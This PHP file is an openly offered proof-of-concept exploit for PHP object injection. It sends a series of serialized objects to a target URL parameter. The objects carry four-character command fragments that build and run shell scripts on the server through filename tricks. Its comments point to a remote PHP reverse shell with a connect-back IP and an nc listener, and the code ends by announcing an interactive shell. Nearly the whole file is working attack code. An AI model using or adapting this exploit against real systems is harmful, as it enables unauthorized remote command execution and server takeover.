<?php 
/*
PHP Object Injection PoC Exploit by 1N3 @CrowdShield - https://crowdshield.com

A simple PoC to exploit PHP Object Injections flaws and gain remote shell access. 

Shouts to @jstnkndy @yappare for the assist!

NOTE: This requires http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz setup on a remote host with a connect back IP configured
*/

print "==============================================================================\r\n";
print "PHP Object Injection PoC Exploit by 1N3 @CrowdShield - https://crowdshield.com\r\n";
print "==============================================================================\r\n";
print "[+] Generating serialized payload...[OK]\r\n";
print "[+] Launching reverse listener...[OK]\r\n";
//system('gnome-terminal -x sh -c \'nc -lvvp 1234\'');
    
class MySink
{

    private $command = false;

    public function __construct($cmd)   
    {
        $this->command = $cmd;
    }

    public function __wakeup()
    {
        if (strlen($this->command) > 4) {
            $this->command = false;
        }
    }

    public function __destruct()    
    {
        if (strlen($this->command) > 4) {
            $this->command = false;
        }
        if ($this->command) {
            /* echo "success\r\n"; */
            /* echo $this->command . "\r\n"; */
        }
    }
}

$url = 'http://127.0.0.1/vuln.php?code='; // CHANGE TO TARGET URL/PARAMETER



#create a file called g with ls -th > g

$stage1 = ">sl";
$stage2 = ">ht-";
$stage3 = ">g\>";
$stage4 = ">dir";
$stage5 = "*>v";
$stage6 = ">rev";
$stage7 = "*v>x";



/* #send our malicious payload to be triggered */

$payload1 = ">\;";
$payload2 = ">mi\\";
$payload3 = ">oa\\";
$payload4 = ">wh\\";


$shell1 = "sh x";
$shell2 = "sh g";


print "[+] Sending exploit...[OK]\r\n";

print " [+] Preparing Stager ...[OK]\r\n";

$url_stage1 = $url . urlencode(base64_encode(serialize(new MySink($stage1))));
/* echo $url_stage1."\r\n"; */
$response_stage1 = file_get_contents("$url_stage1");
/* echo $response_stage1."\r\n"; */
usleep(1000);

$url_stage2 = $url . urlencode(base64_encode(serialize(new MySink($stage2))));
/* echo $url_stage2."\r\n"; */
$response_stage2 = file_get_contents("$url_stage2");
/* echo $response_stage2."\r\n"; */
usleep(1000);

$url_stage3 = $url . urlencode(base64_encode(serialize(new MySink($stage3))));
/* echo $url_stage3."\r\n"; */
$response_stage3 = file_get_contents("$url_stage3");
/* echo $response_stage3."\r\n"; */
usleep(1000);

$url_stage4 = $url . urlencode(base64_encode(serialize(new MySink($stage4))));
/* echo $url_stage4."\r\n"; */
$response_stage4 = file_get_contents("$url_stage4");
/* echo $response_stage4."\r\n"; */
usleep(1000);

$url_stage5 = $url . urlencode(base64_encode(serialize(new MySink($stage5))));
/* echo $url_stage5."\r\n"; */
$response_stage5 = file_get_contents("$url_stage5");
/* echo $response_stage5."\r\n"; */
usleep(1000);

$url_stage6 = $url . urlencode(base64_encode(serialize(new MySink($stage6))));
/* echo $url_stage6."\r\n"; */
$response_stage6 = file_get_contents("$url_stage6");
/* echo $response_stage6."\r\n"; */
usleep(1000);

$url_stage7 = $url . urlencode(base64_encode(serialize(new MySink($stage7))));
/* echo $url_stage7."\r\n"; */
$response_stage7 = file_get_contents("$url_stage7");
/* echo $response_stage7."\r\n"; */
usleep(1000);


print " [+] Stager Completed  ...[OK]\r\n";

print " [+] Sending Payload ...[OK]\r\n";


$url_payload1 = $url . urlencode(base64_encode(serialize(new MySink($payload1))));
/* echo $url_payload1."\r\n"; */
$response_payload1 = file_get_contents("$url_payload1");
/* echo $response_payload1."\r\n"; */
usleep(1000);

$url_payload2 = $url . urlencode(base64_encode(serialize(new MySink($payload2))));
/* echo $url_payload2."\r\n"; */
$response_payload2 = file_get_contents("$url_payload2");
/* echo $response_payload2."\r\n"; */
usleep(1000);

$url_payload3 = $url . urlencode(base64_encode(serialize(new MySink($payload3))));
/* echo $url_payload3."\r\n"; */
$response_payload3 = file_get_contents("$url_payload3");
/* echo $response_payload3."\r\n"; */
usleep(1000);

$url_payload4 = $url . urlencode(base64_encode(serialize(new MySink($payload4))));
/* echo $url_payload4."\r\n"; */
$response_payload4 = file_get_contents("$url_payload4");
/* echo $response_payload4; */
usleep(1000);



print " [+] Triggering Payload ...[OK]\r\n";

$url_shell1 = $url . urlencode(base64_encode(serialize(new MySink($shell1))));
$response = file_get_contents("$url_shell1");
echo $response;
usleep(1000);

$url_shell2 = $url . urlencode(base64_encode(serialize(new MySink($shell2))));
$response = file_get_contents("$url_shell2");
echo $response;
usleep(1000);



print " [+] Exploit Success w00t w00t :) ...[OK]\r\n";

print "[+] Dropping down to interactive shell...[OK]\r\n";
print "==============================================================================\r\n";

?>
